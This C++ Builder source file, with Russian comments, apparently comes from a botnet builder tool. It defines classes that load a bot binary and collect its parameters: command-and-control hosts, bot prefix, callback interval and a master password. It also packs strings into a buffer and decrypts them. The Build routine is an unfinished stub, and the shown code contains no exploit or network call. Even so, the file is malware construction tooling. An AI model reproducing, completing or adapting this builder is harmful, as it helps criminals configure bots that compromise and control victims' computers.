//---------------------------------------------------------------------------


#pragma hdrstop

#include "SysUtils.hpp"
#include "BuilderUtils.h"
#include "Memory.h"
#include "Crypt.h"
#include "Strings.h"

#include "Config.h"

//---------------------------------------------------------------------------

PCHAR Error_MemAlloc = "Ошибка выделения памяти!";
PCHAR Error_NoSourceFile = "Исходный файл не открыт!";

PCHAR Status_Warning = "ПРЕДУПРЕЖДЕНИЕ: ";
PCHAR Status_Error   = "ОШИБКА:         ";

PCHAR StrNoParamValue = "Не установлено значение параметра \r\n --";

PCHAR ParamTitle_Hosts   = "Основные хосты бота";
PCHAR ParamTitle_Prefix  = "Префикс бота";
PCHAR ParamTitle_Delay   = "Интервал отстука";
PCHAR ParamTitle_Password = "Основной пароль";



bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
									bool CryptLines, bool TrimLines,
									PCHAR &OutBuf, DWORD &OutBufSize)
{
	//  функция упаковывает строки в одну строку. Каждая строка будет
	//  отделена нулевым символом. В конце последней строки будет стоять
	//  два нулевых символа. Пустые строки будут проигнорированы.

	if (Lines == NULL || Lines->Count == 0)
		return false;

	OutBuf = NULL;
	OutBufSize = 0;


	UnicodeString S;


	// Определяем длину буфера и удаляем пустые строки
	for (int i = Lines->Count - 1; i >= 0; i--)
    {
		S = Lines->Strings[i];
		DWORD OldLength = S.Length();

		if (TrimLines)
			S = S.Trim();

		if (S.Length() == 0)
			Lines->Delete(i);
		else
		{
			if (TrimLines && S.Length() != OldLength)
				Lines->Strings[i] = S;
			OutBufSize += S.Length() + 1;
        }
	}
	if (OutBufSize == 0) return false;

	OutBufSize++; // Резервируем место для дополнительного нуля

	// Собираем данные
	OutBuf = (PCHAR)MemAlloc(OutBufSize);
	if (OutBuf == NULL)
	{
		throw Exception(Error_MemAlloc);
    }

    PCHAR Tmp = OutBuf;

	// Копируем строки
	for (int i = 0; i < Lines->Count; i++)
    {
		S = Lines->Strings[i];
		// Копируем строку
		DWORD SL = S.Length();
		PCHAR Line = NULL;

		if (CryptLines)
		{
			Line = STR::Alloc(SL);
			Decrypt(AnsiString(S).c_str(), Line);
		}
		else
			Line = AnsiString(S).c_str();

		m_memcpy(Tmp, Line, SL);

		if (CryptLines)
			STR::Free(Line);

		// Смещаем указатели
		Tmp += SL;
		*Tmp = 0;
		Tmp++;
	}

	// Добавляем дополнительный ноль
	*Tmp = 0;

	return true;
}


//****************************************************************************
//                             TBotBuilder
//****************************************************************************

__fastcall TBotBuilder::TBotBuilder(TComponent* AOwner)
	: TComponent(AOwner)
{
	FFile = new TMemoryStream();
	FParams = new TCollection(__classid(TBotParam));
	FModules = new TList();
	FActiveModules = new TList();

	// Добавляем основные параметры
	FPrefix    = new TBotParam(this, true, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, ParamTitle_Prefix);
	FDelay     = new TBotParam(this, true, BOTPARAM_DELAY, MAX_DELAY_SIZE, ParamTitle_Delay);
	FHosts     = new TBotParam(this, true, BOTPARAM_MAINHOSTS, MAX_HOSTS_BUF_SIZE, ParamTitle_Hosts);
	FPassword  = new TBotParam(this, true, BOTPARAM_MAINPASSWORD, MAX_PASSWORD_SIZE, ParamTitle_Password);

}

__fastcall TBotBuilder::~TBotBuilder()
{
	delete FParams;
	delete FModules;
	delete FActiveModules;
	delete FFile;
}

// Функция загружает исходный файл
void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
{
	FFile->Size = 0;
	FSourceFileName = "";
	UpdateResultFileName(true);
	TFileStream* S = new TFileStream(FileName, fmOpenRead);

	FFile->LoadFromStream(S);
    FFile->Position = 0;

	delete S;

	FSourceFileName = FileName;
	UpdateResultFileName(false);
}


// Функция собирает сборку
 bool __fastcall TBotBuilder::Build()
{
	if (FFile->Size == 0)
		throw Exception(Error_NoSourceFile);

	// Проверяем параметры
	TStringList* Errors = new TStringList();
	TBotParamStatus Status = CheckParams(Errors);
	UnicodeString ErrorText = Errors->Text;
    delete Errors;

	if (Status != psOk)
	{

		if (Status == psError)
            throw Exception(ErrorText);
    }

	// Записываем

	return false;
}


// Функция проверяет состояние параметров
TBotParamStatus __fastcall TBotBuilder::CheckParams(TStrings* Errors)
{
	TBotParamStatus Result = psOk;

	for (int i = 0; i < FParams->Count; i++)
	{
		TBotParam* Param = (TBotParam*)FParams->Items[i];
		TBotParamStatus Status = Param->Status();
		if (Status == psOk) continue;

		// Более высокое значение статуса означает
		// большую критичность состояния
		if (Status > Result)
			Result = Status;

		// Добавляем строку
		if (Errors)
		{
			UnicodeString Str;
			switch (Status) {
				case psWarning: Str = Status_Warning; break;
				case psError:   Str = Status_Error; break;
			}

			Str += StrNoParamValue;
			Str += Param->DisplayName;

			Errors->Add(Str);
        }
	}

	return Result;
}


// Функция вызывается после изменения значения параметра
void __fastcall TBotBuilder::ParamValueChanged(TBotParam* Sender)
{
	if (Sender == FPrefix)
	{
		// Сменился префикс, меняем имя результирующего файла
		UpdateResultFileName(false);
    }
}

// Функция собирает имя результирующего файла
void __fastcall TBotBuilder::UpdateResultFileName(bool Reset)
{
	// Сбрасываем настройки
	if (Reset)
	{
		FResultFileName = "";
		FResultFileNameChanged = false;
        return;
	}

	// Если имя файла задалось принудительно то выходим
	if (FResultFileNameChanged) return;

	if (FPrefix->IsEmpty())
	{
		// Префикс не установлен
		FResultFileName = "";
		return;
    }

	// Собираем имя
	UnicodeString Path = ExtractFilePath(FSourceFileName);
	UnicodeString Ext  = ExtractFileExt(FSourceFileName);

	FResultFileName = Path + FPrefix->AsUnicodeString + Ext;
}



//****************************************************************************
//                             TBotParam
//****************************************************************************
__fastcall TBotParam::TBotParam(TBotBuilder* AOwner, bool NotNull,
	const char* Name, DWORD Size, const char* Title)
	: TCollectionItem(AOwner->FParams)
{
	if (STRA::IsEmpty(Name))
		throw Exception("Unknown param name!");

	if (Size == 0)
		throw Exception("Unknown param size!");

	FOwner = AOwner;
	FTitle = Title;
	FName = Name;
	FNotNull = NotNull;
	FSize = Size;
	FDataSize = 0;
	FDataSize = 0;
	FData = (PCHAR)malloc(FSize);
	if (!FData)
		throw Exception(Error_MemAlloc);

    m_memset(FData, 0, FSize);
}


__fastcall TBotParam::~TBotParam()
{
	free(FData);
}

// Функция возвращает состояние парметра
TBotParamStatus __fastcall TBotParam::Status()
{
	if (FDataSize == 0)
	{
		if (FNotNull)
			return psError;
		else
			return psWarning;
	}
	return psOk;
}


// Функция возвращает отображаемое имя параметра
UnicodeString __fastcall TBotParam::GetDisplayName(void)
{
	if (FTitle.IsEmpty())
		return FName;
	else
		return FTitle;
}

// Функция возвращает истину если параметр пустой
bool __fastcall TBotParam::IsEmpty()
{
	return FDataSize == 0;
}

// Функция очищает параметр
void __fastcall TBotParam::Clear()
{
	FDataSize = 0;
	m_memset(FData, 0, FSize);
}


// Функция устанавливает значение параметра
void __fastcall TBotParam::SetValue(PCHAR Value, DWORD ValueSize)
{
	Clear();

	if (Value && !ValueSize)
		ValueSize = STRA::Length(Value);

	if (Value && ValueSize)
	{
		m_memcpy(FData, Value, ValueSize);
		FDataSize = ValueSize;
	}

	Changed();
}


void __fastcall TBotParam::DoChanged()
{

}

void __fastcall TBotParam::Changed()
{
	DoChanged();
	FOwner->ParamValueChanged(this);
}


UnicodeString __fastcall TBotParam::GetAsUnicodeString()
{
	return FData;
}

void __fastcall TBotParam::SetAsUnicodeString(const UnicodeString &Value)
{
	AnsiString S = Value;
    SetValue(S.c_str(), S.Length());
}

DWORD __fastcall TBotParam::GetAsLong()
{
	int Result = 0;
	if (FDataSize)
		TryStrToInt(FData, Result);
	return Result;
}

void __fastcall TBotParam::SetAsLong(DWORD Value)
{
	AnsiString S(Value);
	SetValue(S.c_str(), S.Length());
}


//****************************************************************************
//                             TBotModule
//****************************************************************************
TBotModule::TBotModule(TBotBuilder* AOwner)
	: TComponent(AOwner)
{
	FBuilder = AOwner;
	if (AOwner)
		AOwner->FModules->Add(this);
}
